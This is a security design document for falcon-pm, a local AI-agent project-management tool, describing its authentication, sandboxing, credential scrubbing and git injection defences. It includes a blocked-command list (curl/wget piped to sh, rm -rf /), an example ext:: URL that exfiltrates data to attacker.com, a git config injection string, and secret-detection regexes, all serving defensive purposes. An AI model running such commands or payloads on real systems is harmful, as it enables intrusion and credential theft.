# Security Design Document

## Overview

This document covers security considerations for falcon-pm, including authentication, credential management, and secure defaults for a developer workstation environment.

## Authentication Strategy

### Local Development (Default)

For single-user, local workstation use:

```typescript
// Minimal auth - trust local connections
const isLocalConnection = (req: Request): boolean => {
  const ip = req.ip || req.socket.remoteAddress;
  return ip === '127.0.0.1' || ip === '::1' || ip === 'localhost';
};

// Optional token for WebSocket connections
const localToken = crypto.randomBytes(32).toString('hex');
// Stored in ~/.falcon/session.json, regenerated on startup
```

### Future Multi-User Support

For team/server deployments:

```typescript
interface AuthConfig {
  mode: 'local' | 'token' | 'oauth';
  tokenSecret?: string;
  oauthProvider?: 'github' | 'google';
}

// JWT-based authentication
import jwt from 'jsonwebtoken';

function generateToken(userId: string): string {
  return jwt.sign({ userId }, config.tokenSecret, { expiresIn: '24h' });
}

function verifyToken(token: string): { userId: string } {
  return jwt.verify(token, config.tokenSecret) as { userId: string };
}
```

## Agent API Authentication

Agents authenticate via a simple header-based mechanism:

```typescript
// Agent requests include X-Agent-ID header
app.use('/api/agent', (req, res, next) => {
  const agentId = req.headers['x-agent-id'];

  if (!agentId) {
    return res.status(401).json({ error: { code: 'UNAUTHORIZED', message: 'Missing X-Agent-ID' }});
  }

  // Verify agent exists and is in WORKING state
  const agent = await getAgent(agentId);
  if (!agent || agent.status !== 'working') {
    return res.status(403).json({ error: { code: 'FORBIDDEN', message: 'Agent not authorized' }});
  }

  req.agent = agent;
  next();
});
```

### Agent-Project Authorization

Agent API endpoints validate that the requesting agent belongs to the same project as the target issue. This prevents cross-project data access:

```typescript
// In each agent endpoint handler
const issue = repos.issues.getById(issueId);
if (!issue) {
  return res.status(404).json({ error: { code: 'NOT_FOUND', message: 'Issue not found' }});
}

const agent = repos.agents.getById(agentId);
if (agent.projectId !== issue.projectId) {
  return res.status(400).json({
    error: {
      code: 'VALIDATION_ERROR',
      message: 'Agent is not assigned to this project',
    },
  });
}
```

This check is performed in the agent router middleware and applies to all `/api/agent/issues/:id/*` endpoints.

**Note on Phase 5 Implementation:** The current implementation validates agent-project association but does not enforce agent `status === 'working'` checks. Phase 5 will add full status validation to ensure agents can only access issues when actively assigned to work on them.

### Network Boundary

The agent API (`/api/agent/*`) is designed for **internal use only**. Agents run as local subprocesses on the same machine as the Falcon PM server and communicate over localhost.

**Security assumption:** The agent API does NOT implement authentication beyond the X-Agent-ID header check. This is acceptable because:

1. The server binds to localhost only (127.0.0.1)
2. Agents are spawned by the orchestrator, not external clients
3. Multi-tenancy is not a design goal for local development

**Production consideration:** If the agent API is ever exposed beyond localhost (e.g., for remote agent execution), additional authentication (JWT, mTLS) would be required. The current X-Agent-ID header provides identification, not authentication.

## GitHub Token Management

### Storage

```yaml
# ~/.falcon/config.yaml
github:
  token: ${GITHUB_TOKEN}  # Environment variable reference
```

Tokens are never stored directly in config files. Use environment variable references:

```typescript
function resolveConfigValue(value: string): string {
  if (value.startsWith('${') && value.endsWith('}')) {
    const envVar = value.slice(2, -1);
    return process.env[envVar] || '';
  }
  return value;
}
```

### Credential Hierarchy

1. **Environment variables**: Highest priority, checked first
2. **System keychain**: macOS Keychain, Windows Credential Manager (future)
3. **Config file**: Only for env var references, never raw tokens

```typescript
async function getGitHubToken(): Promise<string> {
  // 1. Check environment
  if (process.env.GITHUB_TOKEN) {
    return process.env.GITHUB_TOKEN;
  }

  // 2. Check keychain (future)
  // const keychainToken = await keytar.getPassword('falcon-pm', 'github');
  // if (keychainToken) return keychainToken;

  // 3. Check config
  const config = await loadConfig();
  const tokenRef = config.github?.token;
  if (tokenRef) {
    return resolveConfigValue(tokenRef);
  }

  throw new Error('GitHub token not configured');
}
```

### Required Scopes

Minimum GitHub token permissions:
- `repo`: Full repository access
- `workflow`: Trigger workflow runs (optional)
- `read:org`: Read organization membership (optional)

```typescript
async function validateGitHubToken(token: string): Promise<boolean> {
  const octokit = new Octokit({ auth: token });

  try {
    const { headers } = await octokit.rest.users.getAuthenticated();
    const scopes = headers['x-oauth-scopes']?.split(', ') || [];

    if (!scopes.includes('repo')) {
      console.warn('GitHub token missing "repo" scope');
      return false;
    }

    return true;
  } catch {
    return false;
  }
}
```

## Subscription Credential Storage

Claude Code and OpenAI use local credentials; Falcon stores only references and never writes secrets into the database.

```typescript
// No API keys stored in Falcon - credentials are managed via:
// 1. Claude Code: ~/.claude/auth.json (managed by Claude Code)
// 2. OpenAI: local credentials (managed by OpenAI CLI or env)

// Falcon just tracks which subscriptions are configured
interface SubscriptionConfig {
  id: string;
  type: 'claude' | 'openai';
  name: string;  // Display name
  // No secrets stored here
}
```

### Validation

```typescript
async function validateSubscription(type: 'claude' | 'openai'): Promise<boolean> {
  if (type === 'claude') {
    // Check if Claude Code is authenticated
    try {
      const result = await exec('claude --version');
      return result.exitCode === 0;
    } catch {
      return false;
    }
  }

  if (type === 'openai') {
    return Boolean(process.env.OPENAI_API_KEY);
  }

  return false;
}
```

## Folder Permissions

### Falcon Home Directory

```
~/.falcon/
├── config.yaml          # 600 (owner read/write only)
├── pm.db                # 600
├── session.json         # 600 (contains local auth token)
└── projects/
    └── <project>/       # 700 (owner full access)
        ├── config.yaml  # 600
        └── agents/      # 700
```

Rationale: 0o700 on directories prevents other local users from listing agent worktrees, and 0o600 on files keeps tokens, configs, and DB metadata private to the current user.

FALCON_HOME is rejected if it resolves into OS-managed directories (for example `/etc`, `/usr`, `/System`) to avoid accidental writes when environment variables are mis-set. Windows comparisons are case-insensitive and UNC paths are rejected to keep data on local disks.

```typescript
async function ensureSecurePermissions() {
  const falconHome = getFalconHome();

  // Set restrictive permissions
  await fs.chmod(path.join(falconHome, 'config.yaml'), 0o600);
  await fs.chmod(path.join(falconHome, 'pm.db'), 0o600);

  // Walk projects
  const projects = await fs.readdir(path.join(falconHome, 'projects'));
  for (const project of projects) {
    const projectDir = path.join(falconHome, 'projects', project);
    await fs.chmod(projectDir, 0o700);
    await fs.chmod(path.join(projectDir, 'config.yaml'), 0o600);
  }
}
```

### Database Security

```typescript
// SQLite database is file-based
// Security measures:
// 1. File permissions (600)
// 2. No remote access (localhost only)
// 3. No sensitive credentials stored in DB
// 4. Database file created atomically with fs.openSync(..., 'wx') to avoid TOCTOU

// What IS stored:
// - Issue data
// - Agent configuration (names, models, paths)
// - Workflow history

// What is NOT stored:
// - API keys
// - OAuth tokens
// - GitHub tokens
// - Password hashes (no user auth in local mode)
```

## WebSocket Security

```typescript
// 1. Require token on connection
server.on('upgrade', (request, socket, head) => {
  const url = new URL(request.url!, 'http://localhost');
  const token = url.searchParams.get('token');

  if (!token || token !== sessionToken) {
    socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
    socket.destroy();
    return;
  }

  // Accept upgrade
});

// 2. Origin validation (for browser clients)
wss.on('connection', (ws, request) => {
  const origin = request.headers.origin;
  if (origin && !isAllowedOrigin(origin)) {
    ws.close(1008, 'Origin not allowed');
    return;
  }
});

// 3. Message size limits
ws.on('message', (data) => {
  if (data.length > MAX_MESSAGE_SIZE) {
    ws.close(1009, 'Message too large');
    return;
  }
});
```

## Input Validation

### API Request Validation

```typescript
import { z } from 'zod';

// Define schemas
const createIssueSchema = z.object({
  title: z.string().min(1).max(200),
  description: z.string().max(10000).optional(),
  priority: z.enum(['low', 'medium', 'high', 'critical']).optional(),
  labelIds: z.array(z.string().uuid()).optional(),
});

// Validation middleware
function validate(schema: z.ZodSchema) {
  return (req: Request, res: Response, next: NextFunction) => {
    try {
      req.body = schema.parse(req.body);
      next();
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({
          error: {
            code: 'VALIDATION_ERROR',
            message: 'Invalid request body',
            details: error.errors,
          }
        });
      } else {
        next(error);
      }
    }
  };
}

// Usage
app.post('/api/issues', validate(createIssueSchema), createIssue);
```

### Path Traversal Prevention

```typescript
function sanitizePath(userPath: string, basePath: string): string {
  // Resolve to absolute path
  const resolved = path.resolve(basePath, userPath);

  // Ensure it's within base path
  if (!resolved.startsWith(basePath)) {
    throw new Error('Path traversal detected');
  }

  return resolved;
}

// Usage for document paths
const safePath = sanitizePath(
  userProvidedPath,
  path.join(FALCON_HOME, 'projects', projectSlug)
);
```

## Agent Sandboxing

### File System Access

```typescript
// Agents operate within their workspace only
const agentWorkDir = path.join(
  FALCON_HOME,
  'projects',
  project.slug,
  'agents',
  agent.name
);

// Claude Agent SDK configuration
const result = await query({
  prompt,
  options: {
    cwd: agentWorkDir,
    additionalDirectories: [],  // No access outside workDir
    sandbox: {
      enabled: true,
      autoAllowBashIfSandboxed: true,
    },
  }
});
```

### Command Execution

```typescript
// Limited commands for agents
const allowedBashCommands = [
  'git *',
  'npm *',
  'npx *',
  'node *',
  'tsc *',
  'eslint *',
  'prettier *',
  'vitest *',
  'pytest *',
];

// Block dangerous commands
const blockedCommands = [
  'rm -rf /',
  'sudo *',
  'chmod 777 *',
  'curl * | sh',
  'wget * | sh',
];
```

## Rate Limiting

```typescript
import rateLimit from 'express-rate-limit';

// API rate limiting
const apiLimiter = rateLimit({
  windowMs: 60 * 1000,  // 1 minute
  max: 100,  // 100 requests per minute
  message: { error: { code: 'RATE_LIMITED', message: 'Too many requests' }},
});

app.use('/api', apiLimiter);

// More restrictive for expensive operations
const expensiveLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 10,
});

app.use('/api/issues/:id/start', expensiveLimiter);
app.use('/api/orchestrator/start', expensiveLimiter);

// Webhook-specific rate limiting (external-facing endpoint)
const webhookLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 60,  // 60 requests per minute (1 per second average)
});

app.use('/api/github/webhook', webhookLimiter);
```

### Endpoint-Specific Rate Limits

| Endpoint | Rate Limit | Rationale |
|----------|-----------|-----------|
| `/api/*` (general) | 100 req/min | Standard API protection |
| `/api/github/webhook` | 60 req/min | Stricter limit for external-facing webhook endpoint; averages 1 req/sec |
| `/api/issues/:id/start`, `/api/orchestrator/start` | 10 req/min | Expensive operations that trigger agent invocation |

The webhook rate limit is intentionally stricter than the general API limit because webhooks are externally triggered (potential abuse vector), each webhook triggers database operations, and legitimate GitHub webhook traffic rarely exceeds 1/sec for a single repo.

## Logging and Auditing

```typescript
interface AuditLog {
  timestamp: Date;
  action: string;
  actor: 'human' | 'agent' | 'system';
  actorId?: string;
  resourceType: string;
  resourceId: string;
  details?: Record<string, unknown>;
}

async function audit(log: Omit<AuditLog, 'timestamp'>) {
  await db.insert(auditLogs).values({
    ...log,
    timestamp: new Date(),
  });

  // Also log to stdout in dev
  if (process.env.NODE_ENV === 'development') {
    console.log(`[AUDIT] ${log.action} on ${log.resourceType}:${log.resourceId} by ${log.actor}`);
  }
}

// Usage
await audit({
  action: 'issue.start',
  actor: 'human',
  actorId: 'local-user',
  resourceType: 'issue',
  resourceId: issueId,
  details: { presetId },
});
```

## Security Checklist

### Before Production

- [ ] Enable HTTPS for all connections
- [ ] Implement proper authentication (JWT/OAuth)
- [ ] Set up audit logging
- [ ] Configure rate limiting
- [ ] Review file permissions
- [ ] Scan dependencies for vulnerabilities
- [ ] Set up security headers (helmet.js)

### Runtime

- [ ] Validate all user inputs
- [ ] Sanitize file paths
- [ ] Use parameterized queries (Drizzle handles this)
- [ ] Don't log sensitive data
- [ ] Handle errors without leaking info

### Agent Security

- [ ] Agents cannot access outside their workspace
- [ ] Agents cannot execute arbitrary commands
- [ ] Agent output is sanitized before display
- [ ] Agent API requires valid agent ID in WORKING state

## HTTP Security Headers

The API server sets the following security headers on all responses:

```typescript
// server.ts security middleware
app.use((_req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'");
  next();
});
```

### Header Explanations

| Header | Value | Purpose |
|--------|-------|---------|
| `X-Frame-Options` | `DENY` | Prevents clickjacking by disallowing embedding in iframes |
| `X-Content-Type-Options` | `nosniff` | Prevents MIME type sniffing attacks |
| `Content-Security-Policy` | See below | Controls allowed resource sources |

### CSP Policy Breakdown

- `default-src 'self'`: Default to same-origin only
- `script-src 'self'`: Scripts from same origin only
- `style-src 'self' 'unsafe-inline'`: Styles from same origin plus inline styles (required for Tailwind CSS utility classes)
- `img-src 'self' data:`: Images from same origin and data URIs
- `font-src 'self'`: Fonts from same origin only

**Note on `unsafe-inline` for styles:** Tailwind CSS generates utility classes that may be applied dynamically. While `unsafe-inline` is generally discouraged, it's required for Tailwind's runtime behavior. The risk is mitigated by the localhost-only deployment model.

## WebSocket Origin Configuration

WebSocket connections validate the `Origin` header to prevent cross-site WebSocket hijacking attacks.

### Configuration

By default, WebSocket connections are allowed from localhost origins only:
- `http://localhost:5174`
- `http://127.0.0.1:5174`
- `http://localhost:3000`
- `http://127.0.0.1:3000`

To allow additional origins, set the `FALCON_PM_CORS_ORIGINS` environment variable to a comma-separated list:

```bash
FALCON_PM_CORS_ORIGINS="http://localhost:5174,http://localhost:3000,https://dashboard.example.com"
```

This variable is shared between the HTTP CORS middleware and WebSocket origin validation to ensure consistent behavior.

### Implementation

```typescript
// websocket.ts
function resolveAllowedOrigins(): Set<string> {
  const raw = process.env.FALCON_PM_CORS_ORIGINS;
  if (!raw) {
    return new Set(DEFAULT_LOCALHOST_ORIGINS);
  }

  const origins = raw
    .split(',')
    .map((origin) => origin.trim())
    .filter((origin) => origin.length > 0);

  return new Set(origins.length > 0 ? origins : DEFAULT_LOCALHOST_ORIGINS);
}

function isOriginAllowed(request: IncomingMessage): boolean {
  const origin = request.headers.origin;
  // Allow connections without Origin header (non-browser clients)
  if (!origin) return true;
  return resolveAllowedOrigins().has(origin);
}
```

### Non-Browser Clients

Connections without an `Origin` header (e.g., from CLI tools, scripts, or server-side clients) are allowed by default. This is standard behavior since only browsers send the `Origin` header, and the primary threat model is browser-based cross-site attacks.

## Git Credential Scrubbing

The git-sync layer (`src/pm/agents/git-sync.ts`) scrubs credentials from error messages before they are propagated or logged. This prevents accidental exposure of tokens in logs, error reports, or UI displays.

### Scrubbed Patterns

The following regex patterns are matched and replaced with `[REDACTED]`:

| Pattern | Description | Example |
|---------|-------------|---------|
| `https?://[^:]+:[^@]+@` | URLs with embedded credentials | `https://user:token@github.com` |
| `ghp_[A-Za-z0-9_]+` | GitHub Personal Access Tokens (classic) | `ghp_xxxxxxxxxxxx` |
| `github_pat_[A-Za-z0-9_]+` | GitHub Fine-Grained PATs | `github_pat_xxxxxxxxxxxx` |
| `gho_[A-Za-z0-9_]+` | GitHub OAuth Tokens | `gho_xxxxxxxxxxxx` |
| `ghs_[A-Za-z0-9_]+` | GitHub App Installation Tokens | `ghs_xxxxxxxxxxxx` |
| `ghr_[A-Za-z0-9_]+` | GitHub Refresh Tokens | `ghr_xxxxxxxxxxxx` |
| `glpat-[A-Za-z0-9_-]+` | GitLab Personal Access Tokens | `glpat-xxxxxxxxxxxx` |
| `Bearer\s+[A-Za-z0-9._-]+` | Bearer tokens in headers | `Bearer eyJhbGci...` |
| `AKIA[A-Z0-9]{16}` | AWS Access Key IDs | `AKIAIOSFODNN7EXAMPLE` |
| `aws_secret_access_key...` | AWS Secret Access Keys | `aws_secret_access_key=wJalrXUtn...` |
| `sk-[A-Za-z0-9]{20,}` | OpenAI API Keys | `sk-xxxxxxxxxxxx...` |
| `sk-ant-[A-Za-z0-9_-]+` | Anthropic API Keys | `sk-ant-xxxxxxxxxxxx` |
| `xoxb-[A-Za-z0-9-]+` | Slack Bot Tokens | `xoxb-xxxxxxxxxxxx` |
| `xoxp-[A-Za-z0-9-]+` | Slack User Tokens | `xoxp-xxxxxxxxxxxx` |

### Implementation

```typescript
function scrubCredentials(message: string): string {
  let scrubbed = message;
  for (const pattern of CREDENTIAL_PATTERNS) {
    scrubbed = scrubbed.replace(pattern, '[REDACTED]');
  }
  return scrubbed;
}

function wrapGitError(error: unknown): Error {
  if (error instanceof Error) {
    const scrubbed = scrubCredentials(error.message);
    if (scrubbed !== error.message) {
      const newError = new Error(scrubbed);
      newError.stack = error.stack ? scrubCredentials(error.stack) : undefined;
      return newError;
    }
  }
  return error instanceof Error ? error : new Error(String(error));
}
```

All git operations in `git-sync.ts` wrap errors through `wrapGitError()` before re-throwing, ensuring credentials are never exposed in error messages.

## Agent Output Credential Scrubbing

Agent invokers (`claude-code-invoker.ts`, `codex-cli-invoker.ts`) scrub credentials from ALL output **before** publishing to the OutputBus. This boundary is security-critical:

```
Agent Process → JSON Events → scrubCredentials() → OutputBus → WebSocket → UI
                              ↑
                        SCRUBBING BOUNDARY
```

**Important for future development:** Any new output path from agent processes MUST call `scrubCredentials()` before the data leaves the invoker. The shared patterns are defined in `credential-scrubber.ts`.

This ensures credentials are never stored in logs, databases, or transmitted over WebSockets, regardless of where the output ultimately ends up.

## Orchestrator Error Credential Scrubbing

The orchestrator runner (`runner.ts`) scrubs credentials from error messages **before** storing them in `orchestrationError` issue attributes. This is a second scrubbing boundary, distinct from the agent output boundary:

```
GitHub API Error → error.message → scrubCredentials() → orchestrationError attribute → Database → Dashboard/API
                                    ↑
                              SCRUBBING BOUNDARY
```

This applies to all orchestrator methods that catch GitHub-related errors:
- `ensurePullRequest()` — PR creation failures
- `maybePostReviewComment()` — Comment posting failures
- `maybeAutoMerge()` — Merge/status check failures

**Convention for new runner methods:** Any orchestrator code that catches errors from external services and stores the message in `orchestrationError` MUST call `scrubCredentials()` before storage. Error messages from external APIs may contain embedded credentials.

## Git Hook Protection

Cloned repositories can contain malicious `.git/hooks/` scripts that execute automatically on git operations (commit, checkout, merge, etc.). To prevent remote code execution (RCE) from untrusted repos, hooks are disabled **during** the clone operation itself:

```typescript
// SECURITY: Disable git hooks DURING clone to prevent RCE from malicious repos.
// The -c option applies the config before any hooks can execute.
await simpleGit(undefined, defaultOptions).clone(repoUrl, worktreePath, [
  '-c',
  'core.hooksPath=/dev/null',
  '--depth',
  '1',
  '--single-branch',
  '-b',
  baseBranch,
]);

// Ensure hooks remain disabled (belt-and-suspenders)
await git.addConfig('core.hooksPath', '/dev/null');
```

**Critical:** The `-c core.hooksPath=/dev/null` option is passed to the clone command itself, ensuring that even `post-checkout` hooks from the cloned repository cannot execute. Previously, setting this config *after* clone was vulnerable because malicious hooks could run during the clone process.

## Git Command Injection Prevention

### Repository URL Validation

Before cloning, repository URLs are validated to prevent command injection via git's `ext::` protocol handler:

```typescript
function validateRepoUrl(url: string): void {
  // Reject dangerous protocols that can execute commands
  if (url.startsWith('ext::')) {
    throw new Error('Invalid repository URL: ext:: protocol is not allowed');
  }
  if (url.startsWith('file://')) {
    throw new Error('Invalid repository URL: file:// protocol is not allowed');
  }

  // Allow: https://, http://, git://, ssh://, git@host:path, /local/path
  const isAllowedProtocol = ALLOWED_URL_PROTOCOLS.some((p) => url.startsWith(p));
  const isSshSyntax = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+:/.test(url);
  const isLocalPath = url.startsWith('/') || /^[A-Za-z]:[\\/]/.test(url);

  if (!isAllowedProtocol && !isSshSyntax && !isLocalPath) {
    throw new Error('Invalid repository URL: must use https, git, ssh protocol, git@ syntax, or local path');
  }
}
```

The `ext::` protocol is particularly dangerous as it can execute arbitrary shell commands:
```bash
# Example malicious URL (BLOCKED):
ext::sh -c 'curl attacker.com/exfil?$(whoami)'% >&2
```

### GitHub URL Parsing (parseRepoUrl)

The `parseRepoUrl()` function in `src/pm/github/repo.ts` parses GitHub repository URLs to extract owner and repo name. It supports three formats:

| Format | Example | Regex |
|--------|---------|-------|
| HTTPS | `https://github.com/owner/repo` | `^https?://github\.com/([^/]+)/([^/]+)` |
| SSH | `git@github.com:owner/repo` | `^git@github\.com:([^/]+)/([^/]+)` |
| Short | `owner/repo` | `^([^/:]+)/([^/]+)$` |

**Security Constraint:** The short format regex `^([^/:]+)/([^/]+)$` explicitly rejects owner names containing `:` or `/`. This prevents:

1. **SSH URL misparse:** Input like `git@github.com:owner/repo` being incorrectly treated as short format with owner = `git@github.com`
2. **Protocol injection:** Crafted inputs that could be parsed ambiguously

```typescript
// Short format - reject if owner contains ':'
const shortMatch = url.match(/^([^/:]+)\/([^/]+)$/);
// The [^/:] character class ensures ':' is not in the owner
```

This validation is security-relevant and MUST be preserved in any reimplementation.

### Flag Injection Protection

The `commitAndPushAgentWork()` function validates the `files` array to prevent command-line flag injection:

```typescript
for (const file of files) {
  if (file !== '-A' && file.startsWith('-')) {
    throw new Error(`Invalid file path: "${file}" looks like a flag`);
  }
}
```

This prevents attackers from injecting git flags via crafted file paths (e.g., `--exec=malicious_command`). The `-A` flag is explicitly allowed as it's the default for staging all changes.

### Git Config Injection Prevention

Git user configuration values (`user.name`, `user.email`) are validated before being written to prevent config injection via newlines:

```typescript
const CONTROL_CHAR_PATTERN = /[\n\r\0]/;

function validateGitConfigValue(value: string, fieldName: string): void {
  if (CONTROL_CHAR_PATTERN.test(value)) {
    throw new Error(
      `Invalid ${fieldName}: cannot contain newlines or control characters`
    );
  }
}
```

This prevents attacks where a malicious user.name like `"Attacker\n[core]\nhooksPath = /tmp/evil"` could inject additional git config entries.

## fs-layout Path Validation

The `fs-layout.ts` module validates path segments using `hasTraversalSegments()` from `db/path-validation.ts`:

### Validated Parameters

| Function | Parameter | Validation |
|----------|-----------|------------|
| `getProjectRoot()` | `falconHome` | Non-empty, absolute path |
| `getProjectRoot()` | `projectSlug` | Non-empty, no traversal |
| `getAgentWorktreePath()` | `agentName` | Non-empty, no traversal |
| `getIssuePath()` | `issueId` | Non-empty, no traversal |

### falconHome Validation

```typescript
function validateFalconHome(falconHome: string): void {
  if (!falconHome || falconHome.trim() === '') {
    throw new Error('Invalid falconHome: cannot be empty');
  }
  if (!path.isAbsolute(falconHome)) {
    throw new Error('Invalid falconHome: must be an absolute path');
  }
}
```

### Path Segment Validation

```typescript
function validatePathSegment(value: string, paramName: string): void {
  if (!value || value.trim() === '') {
    throw new Error(`Invalid ${paramName}: cannot be empty`);
  }
  if (hasTraversalSegments(value)) {
    throw new Error(`Invalid ${paramName}: path traversal detected`);
  }
}
```

This prevents path traversal attacks where malicious values like `../../../etc/passwd` could escape the intended directory structure.

### Cross-Platform Path Validation

The `isSafeRelativePath()` function in `src/pm/api/validation.ts` validates paths for BOTH Unix and Windows patterns regardless of the host OS:

```typescript
// Rejects these even on Unix:
// - C:\Windows\System32  (Windows absolute)
// - \\server\share       (UNC path)
// - //network/path       (Network path)
```

**Rationale:** User input may originate from different platforms (clipboard paste, API calls). Validating only for the host OS would allow Windows-style paths to bypass checks on Unix servers.

**Do not remove** Windows path checks even if the server only runs on Unix.

## GitHub Webhook Security

### Signature Verification

GitHub webhook requests are authenticated using HMAC-SHA256 signatures. The webhook handler verifies the `x-hub-signature-256` header against the payload using a shared secret. The signature comparison uses `crypto.timingSafeEqual()` to prevent timing attacks.

**Configuration:**

1. `webhookSecret` option passed to `createGitHubWebhookRouter()`
2. `GITHUB_WEBHOOK_SECRET` environment variable (fallback)

**Security requirement:** By default, webhook signature verification is **required**. If neither the option nor environment variable is set, webhooks are rejected with a validation error. This prevents accepting forged webhook payloads from attackers.

To disable signature verification for local development (NOT recommended for production):

```typescript
createGitHubWebhookRouter({
  repos,
  requireSecret: false,  // Only for local development
});
```

### Replay Attack Prevention

The webhook handler tracks delivery IDs to prevent replay attacks:

- Delivery IDs are cached for **5 minutes** (TTL)
- Duplicate deliveries are detected and silently acknowledged (`200 OK` with `{ ok: true }`)
- No processing occurs for duplicate deliveries
- Cache is capped at **10,000 entries** to prevent memory exhaustion during DoS attacks

**Design decision:** We return success for duplicates rather than an error to prevent GitHub from retrying. From GitHub's perspective, the delivery was "successful" (acknowledged), even though we didn't process it again.

**LRU eviction:** When the cache reaches its 10,000 entry limit, it evicts the oldest 10% of entries (1,000 entries) in a single batch. This amortizes eviction overhead while keeping memory bounded. The alternative of evicting one entry at a time would cause lock contention under high load.

**Limitation:** The replay cache is in-memory only and is lost on server restart. For production deployments with high availability requirements, consider implementing persistent delivery tracking.

### Webhook Payload Validation

Beyond HMAC signature verification, the webhook handler performs defense-in-depth validation on payload fields before processing:

| Field | Validation | On Failure |
|-------|-----------|------------|
| `pull_request.number` | Must be a `number`, integer, and positive (`> 0`) | Treated as `undefined`; webhook silently acknowledged without processing |
| `repository.html_url` | Must be present and non-empty | Webhook silently acknowledged without processing |
| `pull_request.head.ref` | Must be present and non-empty | Webhook silently acknowledged without processing |

**Design decision:** Invalid fields cause the webhook to be silently acknowledged (`200 OK`) rather than rejected with an error. This prevents GitHub from retrying malformed deliveries and matches the pattern used for unrecognized events.

**Convention for new handlers:** All numeric payload fields from external sources MUST be validated as positive integers before use, even behind the HMAC gate.

### Supported Webhook Events

Currently, only `pull_request` events are processed. All other event types (`push`, `check_run`, `issue_comment`, etc.) return `200 OK` without processing.

**Future enhancement:** Add support for `check_run` (CI status updates) and `issue_comment` (bot command parsing).

### Middleware Ordering Constraint

**CRITICAL:** The GitHub webhook route **MUST** be registered **BEFORE** the global `express.json()` middleware.

The webhook router uses a custom JSON parser with a `verify` callback that captures the raw request body (`req.rawBody`). This raw body is required for HMAC-SHA256 signature verification. If the global JSON parser runs first, it consumes the body stream and the raw bytes are lost.

```typescript
// CORRECT order in server.ts:
app.use('/api/github/webhook', createGitHubWebhookRouter(...));  // Has its own JSON parser
app.use(express.json({ limit: '100kb' }));                       // Global parser AFTER
```

**Consequence of violation:** Signature verification will fail for all webhook requests, breaking GitHub integration and potentially exposing the system to forged webhook attacks.

## Worktree Existence Checks

All git-sync functions that operate on existing agent worktrees verify the worktree exists before proceeding:

```typescript
async function assertWorktreeExists(worktreePath: string): Promise<void> {
  if (!(await pathExists(worktreePath))) {
    throw new Error(`Agent worktree not found: ${worktreePath}`);
  }
}
```

This is called at the start of:
- `checkoutIssueBranch()`
- `syncIdleAgentToBase()`
- `pullRebase()`
- `getAgentStatus()`
- `commitAndPushAgentWork()`

This provides clear error messages when attempting to operate on non-existent worktrees, rather than cryptic git errors.
